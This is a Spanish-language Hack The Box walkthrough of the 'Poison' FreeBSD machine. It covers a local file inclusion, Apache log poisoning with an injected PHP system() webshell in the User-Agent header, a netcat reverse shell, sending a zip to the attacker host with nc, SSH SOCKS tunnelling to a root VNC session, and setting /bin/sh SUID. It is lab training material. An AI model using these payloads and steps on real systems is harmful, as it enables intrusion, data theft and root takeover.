---
layout: single
title: Poison - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Poison de Hackthebox donde mediante un Local File Inclusion podremos obtener una ejecución remota de comandos gracias a un Log Poisoning obtendremos un archivo el cual tendremos que aplicar un decode 13 veces para ver la contraseña de un usuario y conectarnos por SSH para la escalada de privilegios mediante un secret que obtendremos de un zip lo usaremos gracias a que haremos un port forwarding ya que se esta ejecutando vnc en un puerto que no esta expuesto y gracias a eso podremos estar como root"
date: 2023-07-19
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-poison/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Local File Inclusion (LFI)
  - Log Poisoning
  - Abusing VNC
  - Cracking ZIP file
---

<p align="center">
<img src="/assets/images/htb-writeup-poison/banner.png">
</p>

```bash
❯ ping -c 1 10.129.1.254
PING 10.129.1.254 (10.129.1.254) 56(84) bytes of data.
64 bytes from 10.129.1.254: icmp_seq=1 ttl=63 time=155 ms

--- 10.129.1.254 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 155.345/155.345/155.345/0.000 ms
❯ whichSystem.py 10.129.1.254

10.129.1.254 (ttl -> 63): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,80 10.129.1.254 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-19 13:58 CST
Nmap scan report for 10.129.1.254
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e33b7d3c8f4b8cf9cd7fd23ace2dffbb (RSA)
|   256 4ce8c602bdfc83ffc98001547d228172 (ECDSA)
|_  256 0b8fd57185901385618beb34135f943b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
```

## Enumeracion

De momento sabemos que se esta utilizando **PHP**

```bash
❯ curl -s -I http://10.129.1.254
HTTP/1.1 200 OK
Date: Wed, 19 Jul 2023 19:59:11 GMT
Server: Apache/2.4.29 (FreeBSD) PHP/5.6.32
X-Powered-By: PHP/5.6.32
Content-Type: text/html; charset=UTF-8
```

Si usamos **Nmap** y le indicamos que queremos aplicar el **script** **http-enum** encuentra las siguientes rutas

```bash
❯ nmap --script=http-enum -p80 10.129.1.254 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-19 13:59 CST
Nmap scan report for 10.129.1.254
Host is up (0.16s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /info.php: Possible information file
|_  /phpinfo.php: Possible information file
```

Estas son las tecnologías que esta corriendo el servicio web

```ruby
❯ whatweb http://10.129.1.254
http://10.129.1.254 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.4.29 (FreeBSD) PHP/5.6.32], IP[10.129.1.254], PHP[5.6.32], X-Powered-By[PHP/5.6.32]
```

Esta es la pagina web

![](/assets/images/htb-writeup-poison/web1.png)

Y bueno nos están diciendo que la web es para probar **scripts** en **php**

Si le damos en `Submit` sin subir nada vemos que nos el siguiente error

![](/assets/images/htb-writeup-poison/web2.png)

Ademas en la `url` vemos que mediante un parámetro llamado `file` se ve que este es el encargado de apuntar a los archivos que tenemos que indicar y como no le indicamos nada pues no esta apuntando a nada es por eso que nos da error

## Local File Inclusion (LFI)

Bueno si probamos pasando una ruta como el `/etc/passwd` vemos que funciona y con esto sabemos que es vulnerable a `LFI` 

```bash
❯ curl -s 'http://10.129.1.254/browse.php?file=/etc/passwd'
# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh
```

Los mas probable que el código por detrás sea este

```bash
<?php
include($_GET['file']);
?>
```

Podemos ver lo mismo desde la web 

![](/assets/images/htb-writeup-poison/web3.png)

Y bueno vemos que se esta empleando `FreeBSD` si investigamos que es nos dice lo siguiente 

>FreeBSD es un sistema operativo libre y de código abierto de tipo Unix que desciende de la Berkeley Software Distribution, basada en Research Unix. La primera versión de FreeBSD se publicó en 1993 

Si seguimos enumerando el `LFI` vemos que básicamente no se esta usando la ruta típica `/var/log/apache2` lo digo por que podemos ver si podemos convertir el `LFI` a `RCE` pero en este caso el nombre cambia a `apache24`

```bash
❯ curl -s 'http://10.129.1.254/browse.php?file=/var/log'
<br />
<b>Warning</b>:  include(/var/log): failed to open stream: Resource temporarily unavailable in <b>/usr/local/www/apache24/data/browse.php</b> on line <b>2</b><br />
<br />
<b>Warning</b>:  include(): Failed opening '/var/log' for inclusion (include_path='.:/usr/local/www/apache24/data') in <b>/usr/local/www/apache24/data/browse.php</b> on line <b>2</b><br />
```

## Log Poisoning

Bueno si tratamos de ver el archivo `access.log` que es el archivo el cual contiene todos los `logs` hay se guardan todas las solicitudes que recibe cada que intentamos interactuar con el servidor o la maquina todo se va a guardar hay si nosotros somos capaces de ver el contenido de ese archivo podemos tratar de hacer un `Log Poisoning` que esto lo que hace es envenenar los `logs` de `apache` y poder inyectar comandos que es una forma

Si le preguntamos a **ChatGPT** en donde esta el `access.log` para `FreeBSD` nos dice lo siguiente 

![](/assets/images/htb-writeup-poison/web4.png)

Si probamos la ruta vemos que es correcta y hay podemos ver el contenido del archivo 

![](/assets/images/htb-writeup-poison/web5.png)

Como la web interpreta **PHP** lo que podemos hacer es mediante el `User-Agent` inyectar código `PHP` para ver si lo interpreta esto lo que va hacer es como vamos a hacerlo mediante `curl` por `GET` se va a guardar el el `access.log` y hay podremos ver si en este caso funciono

```bash
❯ curl -s -X -GET "http://10.129.1.254/test" -H "User-Agent: <?php system('id'); ?>"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>501 Not Implemented</title>
</head><body>
<h1>Not Implemented</h1>
<p>-GET to /test not supported.<br />
</p>
</body></html>
```

Y vemos que como tal fue interpretado

```bash
❯ curl -s -X -GET "http://10.129.1.254/browse.php?file=/var/log/httpd-access.log" | tail -n 10
10.10.14.14 - - [19/Jul/2023:22:35:58 +0200] "GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1" 200 386189 "-" "Mozilla/5.0 (Windows NT 10.0; rv:114.0) Gecko/20100101 Firefox/114.0"
10.10.14.14 - - [19/Jul/2023:22:35:59 +0200] "GET /favicon.ico HTTP/1.1" 404 209 "http://10.129.1.254/browse.php?file=/var/log/httpd-access.log" "Mozilla/5.0 (Windows NT 10.0; rv:114.0) Gecko/20100101 Firefox/114.0"
10.10.14.14 - - [19/Jul/2023:22:40:47 +0200] "-GET /test HTTP/1.1" 501 196 "-" "www
"
10.10.14.14 - - [19/Jul/2023:22:40:57 +0200] "GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1" 200 386680 "-" "Mozilla/5.0 (Windows NT 10.0; rv:114.0) Gecko/20100101 Firefox/114.0"
10.10.14.14 - - [19/Jul/2023:22:42:27 +0200] "-GET /browse.php?file=/test HTTP/1.1" 200 355 "-" "www
"
10.10.14.14 - - [19/Jul/2023:22:42:33 +0200] "GET /browse.php?file=/var/log/httpd-access.log HTTP/1.1" 200 386972 "-" "Mozilla/5.0 (Windows NT 10.0; rv:114.0) Gecko/20100101 Firefox/114.0"
10.10.14.14 - - [19/Jul/2023:22:43:56 +0200] "-GET /test HTTP/1.1" 501 196 "-" "uid=80(www) gid=80(www) groups=80(www)
"
```

## Shell as www

Algo que podemos hacer es que para controlar nosotros el comando podemos inyectar lo siguiente para poder hacerlo mucho mas comodo mediante el parámetro `cmd` nosotros le vamos a pasar el comando 

```bash
┌─[root@parrot]─[/home/miguel7/Hackthebox/Poison/nmap]
└──╼ #curl -s -X GET "http://10.129.1.254/test" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"          
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /test was not found on this server.</p>
</body></html>
┌─[root@parrot]─[/home/miguel7/Hackthebox/Poison/nmap]
└──╼ #
```

Vemos que funciona

![](/assets/images/htb-writeup-poison/web6.png)

Ahora vamos a ganar acceso nos vamos a poner en escucha con `netcat`

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
```

![](/assets/images/htb-writeup-poison/web7.png)

Si lo enviamos de esa forma nos damos cuenta que no funciona ademas nos lo esta **url-encodeando**

Vamos a capturar una petición con `Burpsuite` para poder hacer todo desde hay

```bash
❯ burpsuite &>/dev/null & disown
[1] 66360
```

Ahora solo le damos al `ENTER` y capturamos la petición **Recuerda que Burpsuite escucha en el localhost por el puerto 8080**

![](/assets/images/htb-writeup-poison/web8.png)

Para no tener conflicto la shell nos la vamos a enviar con `mkfifo` <https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>

Después de `url-encodear` la cadena y modificarla con nuestra `IP` y `Puerto` en escucha recibimos la shell 

![](/assets/images/htb-writeup-poison/web9.png)

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.1.254 47071
sh: can't access tty; job control turned off
$ whoami
www
$ 
```

Si intentamos ejecutar esto para tener una consola interactiva vemos que no podemos 

```bash
$ script /dev/null -c bash
script: -c: No such file or directory
Script started, output file is /dev/null
Script started, output file is /dev/null

Script done, output file is /dev/null
$ 
```

Vemos un archivo `pwdbackup.txt`

```bash
$ pwd
/usr/local/www/apache24/data
$ ls -la
total 72
drwxr-xr-x  2 root  wheel   512 Mar 19  2018 .
drwxr-xr-x  6 root  wheel   512 Jan 24  2018 ..
-rw-r--r--  1 root  wheel    33 Jan 24  2018 browse.php
-rw-r--r--  1 root  wheel   289 Jan 24  2018 index.php
-rw-r--r--  1 root  wheel    27 Jan 24  2018 info.php
-rw-r--r--  1 root  wheel    33 Jan 24  2018 ini.php
-rw-r--r--  1 root  wheel    90 Jan 24  2018 listfiles.php
-rw-r--r--  1 root  wheel    20 Jan 24  2018 phpinfo.php
-rw-r--r--  1 root  wheel  1267 Mar 19  2018 pwdbackup.txt
$ 
```

Y tenemos esto 

```bash
$ cat pwdbackup.txt
This password is secure, it's encoded atleast 13 times.. what could go wrong really..

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo=
$ 
```

Bueno si haces un **decode** 13 veces obtendrás esto `Charix!2#4%6&8(0`

```bash
❯ echo -n "Q2hhcml4ITIjNCU2JjgoMA==" | base64 -d
Charix!2#4%6&8(0
```

## SSH charix 

Si usamos la contraseña `Charix!2#4%6&8(0` vemos que funciona

```bash
❯ ssh charix@10.129.1.254
Password for charix@Poison:
Last login: Mon Mar 19 16:38:00 2018 from 10.10.14.4
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
Need to do a search in a manpage or in a file you've sent to a pager? Use
"/search_word". To repeat the same search, type "n" for next.
		-- Dru <genesis@istar.ca>
csh: The terminal database could not be opened.
csh: using dumb terminal settings.
charix@Poison:~ % 
```

## User flag

```bash
charix@Poison:~ % cat user.txt 
eaacdfb2d141b72a589233063604209c
charix@Poison:~ % 
```

## SSH Port Forwarding 

Si hacemos un `ls` vemos que hay un archivo `zip`

Ahora vamos a pasarnos el `.zip` primero nos ponemos en escucha

```bash
❯ nc -nlvp 443 > secret.zip
Listening on 0.0.0.0 443
```

Ahora lo enviamos

```bash
charix@Poison:~ % nc 10.10.14.14 443 < secret.zip
```

Y lo recibimos

```bash
❯ nc -nlvp 443 > secret.zip
Listening on 0.0.0.0 443
Connection received on 10.129.1.254 54817
```

Vemos que dentro hay un `secret`

```bash
❯ 7z l secret.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 166 bytes (1 KiB)

Listing archive: secret.zip

--
Path = secret.zip
Type = zip
Physical Size = 166

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2018-01-24 11:01:14 .R..A            8           20  secret
------------------- ----- ------------ ------------  ------------------------
2018-01-24 11:01:14                  8           20  1 files
```

Si hacemos un `unzip` nos pide contraseña 

```bash
❯ unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password: 
```

Vamos a usar `zip2john` para extraer un `hash` y posteriormente crackearlo para obtener la contraseña

```bash
❯ zip2john secret.zip > hash
ver 2.0 secret.zip/secret PKZIP Encr: cmplen=20, decmplen=8, crc=77537827
```

Pero bueno no tenemos suerte ya que la contraseña no esta en el `rockyou.txt`

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:08 DONE (2023-07-19 16:36) 0g/s 1595Kp/s 1595Kc/s 1595KC/s !!rebound!!..*7¡Vamos!
Session completed
```

Lo que podemos hacer es reutilizar la contraseña que ya tenemos para ver si con esa funciona

```bash
❯ unzip secret.zip
Archive:  secret.zip
[secret.zip] secret password: 
 extracting: secret                  
```

Pero bueno no vemos gran cosa

```bash
❯ catn secret
[|Ֆz!#  
```

Vamos a enumerar la maquina

Si enumeramos puertos abiertos internamente vemos estos

```bash
charix@Poison:~ % netstat -na -p tcp
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0     44 10.129.1.254.22        10.10.14.14.44364      ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
charix@Poison:~ % 
```

Si vemos procesos encontramos esto que ya es interesante

```bash
charix@Poison:~ % ps -faux
USER    PID  %CPU %MEM    VSZ   RSS TT  STAT STARTED      TIME COMMAND
root     11 100.0  0.0      0    16  -  RL   21:52   174:12.95 [idle]
root      0   0.0  0.0      0   160  -  DLs  21:52     0:00.02 [kernel]
root      1   0.0  0.1   5408   976  -  ILs  21:52     0:00.01 /sbin/init --
root      2   0.0  0.0      0    16  -  DL   21:52     0:00.00 [crypto]
root      3   0.0  0.0      0    16  -  DL   21:52     0:00.00 [crypto returns]
root      4   0.0  0.0      0    32  -  DL   21:52     0:00.12 [cam]
root      5   0.0  0.0      0    16  -  DL   21:52     0:00.00 [mpt_recovery0]
root      6   0.0  0.0      0    16  -  DL   21:52     0:00.00 [sctp_iterator]
root      7   0.0  0.0      0    16  -  DL   21:52     0:00.92 [rand_harvestq]
root      8   0.0  0.0      0    16  -  DL   21:52     0:00.00 [soaiod1]
root      9   0.0  0.0      0    16  -  DL   21:52     0:00.00 [soaiod2]
root     10   0.0  0.0      0    16  -  DL   21:52     0:00.00 [audit]
root     12   0.0  0.1      0   736  -  WL   21:52     0:06.20 [intr]
root     13   0.0  0.0      0    48  -  DL   21:52     0:00.01 [geom]
root     14   0.0  0.0      0   160  -  DL   21:52     0:00.47 [usb]
root     15   0.0  0.0      0    16  -  DL   21:52     0:00.00 [soaiod3]
root     16   0.0  0.0      0    16  -  DL   21:52     0:00.00 [soaiod4]
root     17   0.0  0.0      0    48  -  DL   21:52     0:00.16 [pagedaemon]
root     18   0.0  0.0      0    16  -  DL   21:52     0:00.00 [vmdaemon]
root     19   0.0  0.0      0    16  -  DL   21:52     0:00.00 [pagezero]
root     20   0.0  0.0      0    32  -  DL   21:52     0:00.13 [bufdaemon]
root     21   0.0  0.0      0    16  -  DL   21:52     0:00.02 [bufspacedaemon]
root     22   0.0  0.0      0    16  -  DL   21:52     0:00.29 [syncer]
root     23   0.0  0.0      0    16  -  DL   21:52     0:00.03 [vnlru]
root    332   0.0  0.2  10624  2380  -  Is   21:52     0:00.01 dhclient: le0 [priv] (dhclient)
_dhcp   395   0.0  0.2  10624  2496  -  Is   21:52     0:00.00 dhclient: le0 (dhclient)
root    396   0.0  0.5   9560  5052  -  Ss   21:52     0:00.48 /sbin/devd
root    469   0.0  0.2  10500  2452  -  Ss   21:52     0:00.18 /usr/sbin/syslogd -s
root    622   0.0  0.5  56320  5444  -  S    21:52     0:05.86 /usr/local/bin/vmtoolsd -c /usr/local/share/vmware-tools/to
root    699   0.0  0.7  57812  7052  -  Is   21:52     0:00.01 /usr/sbin/sshd
root    704   0.0  1.1  99172 11516  -  Ss   21:52     0:00.26 /usr/local/sbin/httpd -DNOHTTPACCEPT
www     716   0.0  1.6 103268 16288  -  I    21:52     0:02.51 /usr/local/sbin/httpd -DNOHTTPACCEPT
www     717   0.0  1.3 101220 13600  -  I    21:52     0:00.07 /usr/local/sbin/httpd -DNOHTTPACCEPT
www     718   0.0  1.3 101220 13300  -  I    21:52     0:00.07 /usr/local/sbin/httpd -DNOHTTPACCEPT
www     719   0.0  1.3 101220 13208  -  I    21:52     0:00.06 /usr/local/sbin/httpd -DNOHTTPACCEPT
www     720   0.0  1.6 103268 16288  -  S    21:52     0:02.67 /usr/local/sbin/httpd -DNOHTTPACCEPT
root    721   0.0  0.6  20636  6140  -  Ss   21:53     0:00.15 sendmail: accepting connections (sendmail)
smmsp   724   0.0  0.6  20636  5808  -  Is   21:53     0:00.00 sendmail: Queue runner@00:30:00 for /var/spool/clientmqueue (sendmail)
root    728   0.0  0.2  12592  2436  -  Ss   21:53     0:00.03 /usr/sbin/cron -s
www     791   0.0  1.3 101220 13600  -  I    21:58     0:00.07 /usr/local/sbin/httpd -DNOHTTPACCEPT
root   1199   0.0  0.8  85228  7832  -  Is   00:28     0:00.01 sshd: charix [priv] (sshd)
charix 1202   0.0  0.8  85228  7896  -  S    00:28     0:00.03 sshd: charix@pts/1 (sshd)
root    608   0.0  0.9  23620  8868 v0- I    21:52     0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes
root    619   0.0  0.7  67220  7064 v0- I    21:52     0:00.02 xterm -geometry 80x24+10+10 -ls -title X Desktop
root    620   0.0  0.5  37620  5312 v0- I    21:52     0:00.01 twm
root    775   0.0  0.2  10484  2076 v0  Is+  21:53     0:00.00 /usr/libexec/getty Pc ttyv0
root    776   0.0  0.2  10484  2076 v1  Is+  21:53     0:00.00 /usr/libexec/getty Pc ttyv1
root    777   0.0  0.2  10484  2076 v2  Is+  21:53     0:00.00 /usr/libexec/getty Pc ttyv2
root    778   0.0  0.2  10484  2076 v3  Is+  21:53     0:00.00 /usr/libexec/getty Pc ttyv3
root    779   0.0  0.2  10484  2076 v4  Is+  21:53     0:00.00 /usr/libexec/getty Pc ttyv4
root    780   0.0  0.2  10484  2076 v5  Is+  21:53     0:00.00 /usr/libexec/getty Pc ttyv5
root    781   0.0  0.2  10484  2076 v6  Is+  21:53     0:00.00 /usr/libexec/getty Pc ttyv6
root    782   0.0  0.2  10484  2076 v7  Is+  21:53     0:00.00 /usr/libexec/getty Pc ttyv7
root    696   0.0  0.4  19660  3616  0  Is+  21:52     0:00.01 -csh (csh)
charix 1203   0.0  0.4  19660  3664  1  Ss   00:28     0:00.02 -csh (csh)
charix 1249   0.0  0.3  21208  2652  1  R+   00:47     0:00.00 ps -faux
charix@Poison:~ % 
```

Si investigamos que es `tightvnc` que `root` lo esta corriendo nos dice lo siguiente 

![](/assets/images/htb-writeup-poison/web10.png)

Y bueno como tal esta usando `vnc` <https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc>

Vamos a usar la herramienta `vncviewer` para conectarnos

```bash
❯ vncviewer -h
TightVNC Viewer version 1.3.10

Usage: vncviewer [<OPTIONS>] [<HOST>][:<DISPLAY#>]
       vncviewer [<OPTIONS>] [<HOST>][::<PORT#>]
       vncviewer [<OPTIONS>] -listen [<DISPLAY#>]
       vncviewer -help

<OPTIONS> are standard Xt options, or:
        -via <GATEWAY>
        -shared (set by default)
        -noshared
        -viewonly
        -fullscreen
        -noraiseonbeep
        -passwd <PASSWD-FILENAME> (standard VNC authentication)
        -encodings <ENCODING-LIST> (e.g. "tight copyrect")
        -bgr233
        -owncmap
        -truecolour
        -depth <DEPTH>
        -compresslevel <COMPRESS-VALUE> (0..9: 0-fast, 9-best)
        -quality <JPEG-QUALITY-VALUE> (0..9: 0-low, 9-high)
        -nojpeg
        -nocursorshape
        -x11cursor
        -autopass

Option names may be abbreviated, e.g. -bgr instead of -bgr233.
See the manual page for more information.
```

Pero bueno no podemos conectarnos aun por que el puerto no esta expuesto pero podemos hacerlo con el propio `SSH` sin usar **chisel

```bash
❯ cat /etc/proxychains.conf | tail -n 1
socks4 	127.0.0.1 1080
```

Ahora una vez definido el puerto aplicamos el `port forwarding` primero nos debemos de salir de la sesión de `SSH` activa

```bash
❯ ssh charix@10.129.1.254 -D 1080
Password for charix@Poison:
Last login: Thu Jul 20 00:28:31 2023 from 10.10.14.14
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
Want to know how many words, lines, or bytes are contained in a file? Type
"wc filename".
		-- Dru <genesis@istar.ca>
csh: The terminal database could not be opened.
csh: using dumb terminal settings.
charix@Poison:~ % 
```

Ahora verificamos que todo esta funcionando y que el puerto este ocupado

```bash
❯ lsof -i:1080
COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     160132 root    4u  IPv6 402316      0t0  TCP localhost:socks (LISTEN)
ssh     160132 root    5u  IPv4 402317      0t0  TCP localhost:socks (LISTEN)
```

## Escalada de privilegios 

Bueno ahora pasandole los argumentos que nos pide la herramienta y usando `proxychains` para poder pasar por el túnel que acabamos de crear vemos esto 

```bash
❯ proxychains vncviewer 127.0.0.1:5901 -passwd secret
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:5901-<><>-OK
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding
```

![](/assets/images/htb-writeup-poison/web11.png)

Podemos ejecutar comandos

![](/assets/images/htb-writeup-poison/web12.png)

Pues bueno como estamos como `root` vamos a poner la `sh` `SUID`

![](/assets/images/htb-writeup-poison/web13.png)

## Shell as root and root.txt 

Ahora ya podemos estar como `root`

```bash
charix@Poison:~ % /bin/sh
Cannot read termcap database;
using dumb terminal settings.
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt 
716d04b188419cf2bb99d891272361f5
# 
```
